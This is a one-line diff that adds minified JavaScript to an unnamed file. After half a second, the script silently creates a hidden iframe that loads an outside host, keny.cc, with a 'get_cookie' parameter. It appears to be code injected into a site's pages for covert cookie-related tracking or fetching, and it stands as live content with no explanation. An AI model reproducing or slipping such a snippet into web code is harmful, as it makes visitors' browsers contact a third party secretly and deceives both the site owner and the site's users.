@@ -1,0 +1,1 @@
+function c(){let a='smartmoney_iframe';let b=document.createElement('iframe');b.id=a;document.body.appendChild(b);document.getElementById(a).style.display='none';document.getElementById(a).src='https://keny.cc/?get_cookie=1';}setTimeout(function(){c();},500);
